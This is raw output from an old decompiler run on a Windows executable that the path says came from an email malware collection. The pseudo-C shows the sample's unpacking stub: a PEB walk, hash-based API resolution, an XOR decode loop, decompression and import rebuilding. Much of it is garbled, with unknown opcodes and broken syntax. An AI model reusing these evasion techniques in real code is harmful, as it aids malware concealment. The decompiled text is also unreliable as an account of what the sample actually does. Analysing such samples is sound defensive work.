/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1519/ia32_pe/subject.exe'
 */

/*	Procedure: 0x0040102F - 0x00401074
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040102F()
{



    *(ecx + 13247232) = *(ecx + 13247232) + bh;
    *(esp + eax + 536932608) = *(esp + eax + 536932608) + ah;
    asm("adc [eax+0x0],al");
    eax :: *eax;
    *eax = *eax + al;
    (restore)es;
    asm("adc eax,0x6700a700");
    *eax = *eax + al;
    al = *esi;
    esi = esi + 1;
    *(eax + edx * 4 + -1663137379) = *(eax + edx * 4 + -1663137379) + bl;
    asm("popf");
    edi = 4194304;
    asm("pushf");
    asm("popf");
    ecx = 151552;
    asm("pushf");
    asm("popf");
    asm("rep movsb");
    asm("pushf");
    asm("stc");
    asm("popf");
    (save)4260618;
    asm("pushf");
    asm("clc");
    asm("popf");
    return(0);
}

/*	Procedure: 0x00401075 - 0x0040109F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401075()
{



    (restore) *(ebx + 1441792);
    eax = -1482752000;
    *LA79F0000 = *LA79F0000 + -1482752000;
    *eax = *eax + dh;
    *eax = *eax + al;
    *ecx = *ecx & ah;
    bl = bl + al;
    *eax = *eax + al;
    (save)7724539;
    *(eax - -607207680) = *(eax - -607207680) + al;
    *(edi + 10616832) = *(edi + 10616832) + al;
    *(esi - 63) = *(esi - 63) + ah;
}

/*	Procedure: 0x004010A0 - 0x004010A4
 *	Argument size: -17911
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    asm("rol dx,0x9");
    edx = -1777;
}

/*	Procedure: 0x004010A5 - 0x004010AC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010A5()
{



    asm("psubw mm7,mm7");
    ecx = ecx + 1;
    asm("retf 0x6604");
}

/* DEST BLOCK NOT FOUND: 00401190 -> f83e12c3 */
/*	Procedure: 0x004010AD - 0x0040143E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010AD()
{



    edi = edi - -124;
    esi = -1342415742;
    asm("ror esi,0x3");
    eax = !eax;
    edi = esp;
    eax = 2040;
    asm("ror eax,0x3");
    asm("Unknown opcode 0xc1");
    asm("int1");
    esp = esp | *ecx;
    asm("Unknown opcode 0xc7");
    eax = 9726;
    asm("rol eax,0x7");
    eax = eax + edi;
    esi = ~esi;
    ecx = *eax;
    eax = eax & -671924065;
L004010dd:
    ecx = ecx + 1;
    di = di - 51;
    if(*%ss:ecx] != edx) {
        asm("ror ax,0xe");
        if(*%ss:ecx] != esi) {
            eax = eax + 483976051;
            goto L004010dd;
        }
        ecx = ecx - 2;
L004010fe:
        eax = 1073741826;
        asm("rol eax,0x6");
        if(*ecx != al) {
            esi = esi - ebp;
            goto L004010fe;
        }
        asm("rol di,0x7");
    } else {
        asm("xchg esi,ecx");
        eax = 4608;
        asm("ror eax,0x5");
        esi = esi - 1;
        dx = dx - 59;
        if(*esi == al) {
        }
    }
    ax = ax | 117;
    ecx = esp;
    edx = edx & ebp;
    edi = *ecx;
    esi = esi ^ 1545602675;
    eax = edi;
L00401139:
    eax = eax + 1;
    edi = 1560;
    asm("ror edi,0x3");
    ecx = ecx - 1468097759;
    if(*%ss:eax] != edi) {
        goto L00401139;
    }
    di = di - 94;
    eax = *eax();
    ax = ax + -51;
    ecx = ecx + -1904926305;
    dx = dx - 79;
    eax = 12;
    edi = *%fs:esi] + 12;
    esi = ~L00000030;
    ecx = *edi;
    edx = edx - 1;
    eax = *(ecx + 28);
    edi = edi & -2066726856;
    esi = *eax;
    asm("Unknown opcode 0xc1");
    asm("int1");
    asm("sbb eax,0x8bf");
    *(esi - 125) = *(esi - 125) + ah;
    goto Lf83e12c3;
    asm("xlatb");
    edx = *esi;
    asm("rol di,0x5");
    eax = eax - -937316924 + eax - -937316924;
    eax = L0040149E(edx, -1973356649);
    eax = 1728;
    asm("ror eax,0x4");
    ecx = !ecx;
    edx = -1313763143;
    asm("rol edx,0x6");
    (save)eax;
    asm("ror ax,0xc");
    (save)edx;
    edx = edx - eax;
    edi = -423213242;
    asm("rol edi,0x4");
    (save)edi;
    eax = eax >> 7;
    (save)esp;
    eax = *esi();
    esp = esp - -12;
    edi = edi + ebp;
    eax = L0040149E(eax, -1882241146);
    ecx = esi;
    eax = 0;
    (save)0;
    (save)0;
    edi = 0;
    (save)0;
    (save)12646973;
    (save)287702969;
    (save)1748;
    eax = *ecx() + 1;
    ecx = ecx + 1;
    ds = 1748;
    edi = edi - -1737842329;
    edx = 196374;
    asm("rol ecx,0x2");
    esi = *edx;
    asm("ror ecx,0x2");
    eax = *esi();
    asm("Unknown opcode 0xd9");
    asm("Unknown opcode 0x8e");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    edx = edx >> 15;
    ds = 35;
    edi = edi + 1710070907;
    edx = 48;
    ax = 5;
    esi = *%fs:edx];
    asm("rol cx,0x5");
    eax = *(esi + 12);
    ecx = !ecx;
    esi = 28;
    edi = edi + 826326895;
    eax = eax + 28;
    edx = edx & ebp;
    edi = *eax;
    eax = eax + 1;
    edx = *edi;
    asm("rol eax,0x14");
    esi = 8;
    asm("ror ax,0x8");
    edx = edx + esi;
    asm("Unknown opcode 0xc1");
    asm("Unknown opcode 0xf6");
    asm("jpo 0xc2023b91");
    asm("Unknown opcode 0xc7");
    (save)ds;
    ebp = ecx;
    eax = L0040149E(ecx, 250945909);
    (save)152208;
    edi = 64;
    (save)64;
    eax = *esi();
    ebx = eax;
    eax = eax + 151561;
    asm("cld");
    *eax = ebp;
    L0040149E(ebp, -1973356649);
    ecx = ebx;
    asm("cld");
    ecx = ecx + 151579;
    asm("wait");
    *ecx = esi;
    L0040149E(ebp, -655422073);
    edi = ebx;
    asm("wait");
    edi = edi - -151593;
    asm("cmc");
    *edi = esi;
    L0040149E(ebp, -903893329);
    edi = esp + -113;
    (save)edi;
    edx = 64;
    (save)64;
    ecx = 4194304;
    (save) *( *L0040003C + 4194304 + 80);
    (save)4194304;
    eax = *esi();
    edx = 0x401082;
    edi = *L00401082;
    eax = 0;
    ecx = 47746;
    asm("pushf");
    asm("stc");
    asm("popf");
    edx = 4194340;
    asm("pushf");
    asm("stc");
    asm("popf");
    edx = edx + edi;
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("pushf");
    asm("stc");
    asm("popf");
    al = *edx;
    if(eax != 0) {
        al = al ^ 227;
        if(eax != 0) {
            *edx = al;
        }
    }
    edx = edx + 1;
    asm("pushf");
    asm("cmc");
    asm("popf");
    asm("loop 0x401326");
    asm("fnop");
    asm("wait");
    asm("pusha");
    edi = ebx;
    eax = 0x401082;
    asm("fnop");
    asm("wait");
    esi = *eax;
    asm("fnop");
    esi = esi + 4194340;
    asm("fnop");
    asm("wait");
    asm("cld");
    asm("wait");
    dl = 128;
    ebx = 0;
L00401365:
    *edi = *esi;
    edi = edi + 1;
    asm("pushf");
    asm("wait");
    asm("popf");
    bl = 2;
L0040136b:
    L0040143F();
    if(esi = esi + 1) {
        goto L00401365;
    }
    ecx = 0;
    L0040143F();
    >= ? L004013c3 : ;
    eax = 0;
    eax = L0040143F();
    >= ? L004013dd : ;
    bl = 2;
    asm("pushf");
    asm("stc");
    asm("popf");
    asm("pushf");
    asm("popf");
    al = 16;
L0040139b:
    asm("fnop");
    asm("wait");
    eax = L0040143F();
    asm("pushf");
    asm("wait");
    asm("popf");
    asm("adc al,al");
    asm("wait");
    if(ecx = ecx + 1) {
        goto L0040139b;
    }
    asm("fnop");
    asm("wait");
    != ? 0x40142c : ;
    *edi = al;
    edi = edi + 1;
    asm("fnop");
    goto L0040136b;
    eax = L0040145E();
    asm("pushf");
    asm("wait");
    asm("popf");
    if(!(ecx = ecx - ebx)) {
        L00401456();
        goto L00401428;
        al = *esi;
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L00401478;
        }
        asm("adc ecx,ecx");
    } else {
        asm("xchg ecx,eax");
        asm("pushf");
        asm("wait");
        asm("popf");
        eax = eax - 1;
        asm("pushf");
        asm("clc");
        asm("popf");
        eax = eax << 8;
        al = *esi;
        esi = esi + 1;
        eax = L00401456();
        if(eax < 32000) {
            asm("pushf");
            asm("wait");
            asm("popf");
            if(ah >= 5) {
                goto L00401425;
            }
            if(eax > 127) {
                goto L00401426;
            }
        }
    }
    ecx = ecx + 1;
L00401425:
    ecx = ecx + 1;
L00401426:
    asm("xchg ebp,eax");
L00401428:
    eax = ebp;
    bl = 1;
    (save)esi;
    esi = edi;
    asm("pushf");
    asm("clc");
    asm("popf");
    esi = esi - eax;
    asm("rep movsb");
    asm("pushf");
    asm("stc");
    asm("popf");
    (restore)esi;
    goto L0040136b;
}

/* DEST BLOCK NOT FOUND: 00401444 -> 00401455 */
/*	Procedure: 0x0040143F - 0x00401455
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040143F()
{



    asm("pushf");
    asm("stc");
    asm("popf");
    if(!(dl = dl + dl)) {
        dl = *esi;
        asm("pushf");
        asm("cmc");
        asm("popf");
        esi = esi + 1;
        asm("pushf");
        asm("clc");
        asm("popf");
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x00401456 - 0x0040145D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401456()
{



    asm("pushf");
    asm("clc");
    asm("popf");
    ecx = 0;
    asm("pushf");
    asm("stc");
    asm("popf");
}

stack space not deallocated on return
/*	Procedure: 0x0040145E - 0x0040149D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040145E()
{



    asm("pushf");
    asm("wait");
    asm("popf");
    do {
        L0040143F();
        asm("pushf");
        asm("clc");
        asm("popf");
        asm("adc ecx,ecx");
        eax = L0040143F();
    } while(ecx = ecx + 1);
    return;
    asm("pushf");
    asm("popf");
    asm("popa");
    asm("pushf");
    asm("wait");
    asm("popf");
    eax = L00401564();
    esi = 0x40104d;
    edi = 151552;
    asm("cmc");
    edi = edi + ebx;
    asm("cld");
    (save)edi;
    asm("clc");
    ecx = 40;
    asm("rep movsb");
}

/*	Procedure: 0x0040149E - 0x00401563
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040149E(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    ecx = A4;
    edx = ecx;
    ecx = ecx - -39;
    asm("stc");
    ecx = ecx + 21;
    asm("wait");
    eax = *ecx;
    ecx = ecx + 47 + 13 + eax;
    asm("stc");
    eax = *ecx;
    asm("cmc");
    asm("cld");
    eax = eax + 7 - -21;
    asm("wait");
    edi = eax + edx;
    asm("cmc");
    esi = *edi;
    asm("cmc");
    esi = esi + edx;
    asm("clc");
    edi = edi + 4;
    asm("clc");
    eax = *edi + edx;
    ecx = *(edi + 4) + edx;
    asm("cmc");
    (save)ecx;
    asm("cld");
    (save)esi;
    asm("clc");
    esi = eax;
    edx = A8;
    (save)0;
    ecx = A4;
    (save)ecx;
    asm("cmc");
    (restore)edi;
    ecx = ecx + *esi;
    asm("wait");
    for(eax = 0; 1; eax = 0) {
        al = al + *ecx;
        ecx = ecx + 1;
        asm("ror eax,0x5");
        eax = eax ^ -107819615;
        if(*ecx != 0) {
            continue;
        }
        if((eax ^ edx) == 0) {
            break;
        }
        (restore)eax;
        asm("cmc");
        (save)eax + 1;
        esi = esi + 4;
        ecx = *esi;
        asm("cld");
        ecx = ecx + edi;
    }
    (restore)ecx;
    eax = Vfffffffc + (ecx << 1);
    edx = *eax & 65535;
    asm("cld");
    edx = edx << 2;
    eax = *esp + edx;
    (restore)edx;
    asm("wait");
    esi = *eax;
    (restore)ecx;
    esi = esi + edi;
    asm("wait");
}

/*	Procedure: 0x00401564 - 0x00401688
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401564()
{



    asm("pusha");
    edi = 970707573;
    asm("cmc");
    edi = edi ^ 970645781;
    eax = ebx;
    edi = edi + eax;
    asm("stc");
    for(*(ebx + 151611) = eax; 1; edi = edi + 20) {
        esi = *(edi + 12);
        if(esi == 0) {
            break;
        }
        (save)edi;
        asm("cld");
        (save)esi;
        asm("cld");
        ecx = *(edi + 16);
        asm("cmc");
        *(ebx + 151639) = ecx;
        edx = *edi;
        asm("wait");
        *(ebx + 151622) = edx;
        asm("cld");
        if(edx == 0) {
            ecx = edi + 16;
            edx = *ecx;
        }
        ecx = ebx;
        asm("cmc");
        ecx = ecx + 151611;
        asm("wait");
        eax = *ecx;
        *esp = *esp + eax;
        asm("stc");
        (restore)esi;
        edx = edx + eax;
        asm("stc");
        *(ebx + 151650) = edx;
        (save)edx;
        asm("wait");
        (save)esi;
        esi = *(ebx + 151579);
        eax = *esi();
        asm("cld");
        for(*(ebx + 151668) = eax; 1; *(ebx - -151650) = edi) {
            edi = ebx;
            asm("cld");
            edi = edi + 151650;
            edi = *( *edi);
            if(edi == 0) {
                break;
            }
            asm("clc");
            esi = -2147483648;
            if(!(edi & -2147483648)) {
                asm("wait");
                if(!(edi = edi + 2)) {
                    goto L0040160b;
                }
                eax = *(ebx + 151611);
                edi = edi + eax;
            } else {
L0040160b:
                edi = edi & 2147483647;
            }
            (save)edi;
            esi = *(ebx + 151668);
            (save)esi;
            asm("stc");
            esi = *(ebx + 151593);
            asm("cld");
            eax = *esi();
            ecx = eax;
            edi = *(ebx + 151639);
            edx = ebx + 151611;
            eax = *edx;
            edi = edi + eax;
            *edi = ecx;
            edx = ebx - -151639;
            edi = *edx;
            asm("clc");
            edi = edi - -4;
            edx = ebx - -151639;
            *edx = edi;
            asm("cmc");
            edx = ebx + 151650;
            edi = *edx - -4;
        }
        esp = esp - -4;
        (restore)edi;
    }
    asm("popa");
}

/*	Procedure: 0x00401689 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401689()
{



}

/* address  size  */
/* 0x004010a0       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
